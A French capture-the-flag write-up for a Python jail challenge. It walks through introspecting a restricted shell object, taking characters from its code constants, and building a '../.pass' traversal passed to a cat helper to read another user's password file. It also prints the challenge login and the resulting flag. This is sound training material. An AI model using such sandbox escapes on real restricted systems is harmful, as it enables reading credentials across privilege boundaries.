ssh pyjail1@challenges.ringzer0ctf.com -p 10097

Mot de passe: pyjail1

Il est impossible d'afficher directement le contenu de flag.txt

Cependant en faisant ceci:
print dir()

Je remarque
[`__builtins__`, `shell`]

Ensuite je fais :
print dir(shell)
[`__doc__`, `__module__`, `cat`, `help`, `hint`, `ls`]


donc ensuite on regarde hint et help pour des indices:
>print shell.hint()
    You may need this for the rest: http://docs.python.org/2/reference/datamodel.html
    None
>print shell.help()
    This script run as pyjail2.
    Find a way to print this file /home/pyjail2/.pass


J`essaye ensuite ls qui donne :
print shell.ls()
[`f2`, `f3`, `f1`]

Je cherche le fichier .pass et comme il commence avec un point il ne va pas s'afficher avec un ls (ça prendrait l'option a)

je vais regarder les librairies si possible ... 

print dir(`__doc__`)
>
Executing sandbox
invalid syntax (<string>, line 1)
>print dir(dir(shell)[0])
>
Executing sandbox
[`__add__`, `__class__`, `__contains__`, `__delattr__`, `__doc__`, `__eq__`, `__format__`, `__ge__`, `__getattribute__`, `__getitem__`, `__getnewargs__`, `__getslice__`, `__gt__`, `__hash__`, `__init__`, `__le__`, `__len__`, `__lt__`, `__mod__`, `__mul__`, `__ne__`, `__new__`, `__reduce__`, `__reduce_ex__`, `__repr__`, `__rmod__`, `__rmul__`, `__setattr__`, `__sizeof__`, `__str__`, `__subclasshook__`, `_formatter_field_name_split`, `_formatter_parser`, `capitalize`, `center`, `count`, `decode`, `encode`, `endswith`, `expandtabs`, `find`, `format`, `index`, `isalnum`, `isalpha`, `isdigit`, `islower`, `isspace`, `istitle`, `isupper`, `join`, `ljust`, `lower`, `lstrip`, `partition`, `replace`, `rfind`, `rindex`, `rjust`, `rpartition`, `rsplit`, `rstrip`, `split`, `splitlines`, `startswith`, `strip`, `swapcase`, `title`, `translate`, `upper`, `zfill`]


J'ai finalement trouvé ceci:
En cherchant print dir(shell.help) on trouve im_func ensuite print dir(shell.help.im_func) on trouve func_code ensuite print dir(shell.help.im_func.func_code) on trouve co_consts.

Donc en faisant:
print shell.help.im_func.func_code.co_consts

On voit un tableau dont le 4e élément est 
Find a way to print this file /home/pyjail2/.pass

Or comme on ne peut ni utiliser __ (double underscore) ni de . ni de string, on va récupérer le substring .pass et aussi utiliser l'index du . pour reculer d'un folder


Voici la commande finale
shell.cat(shell.help.im_func.func_code.co_consts[3][46]+shell.help.im_func.func_code.co_consts[3][46]+shell.help.im_func.func_code.co_consts[3][45:51])

ca fera un cat de /home/pyjail2/doc/../.pass ce qui équivaut à /home/pyjail2/.pass

Voici le flag:

ibrbVv6kAEHnR4Shpq8y